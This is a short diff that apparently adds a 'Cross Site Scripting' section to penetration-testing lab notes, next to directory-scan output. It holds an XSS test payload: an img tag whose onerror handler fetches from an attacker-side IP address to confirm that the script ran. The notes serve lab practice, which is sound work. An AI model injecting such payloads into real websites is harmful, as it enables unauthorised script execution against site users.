@@ -260,4 +260,11 @@ by Ben "epi" Risher 🤓                 ver: 2.10.4
 ```
 ![image](https://github.com/user-attachments/assets/841e5497-b81d-45e0-be99-b514ee84d582)
 
+# Cross Site Scripting
+- Test payload
+```shell
+<img src="http://10.10.14.33/invalid" onerror=fetch("http://10.10.14.33/XSS")
+```
+
+![image](https://github.com/user-attachments/assets/db7a2c1e-45b7-468f-b35b-35e81caaedaa)
 
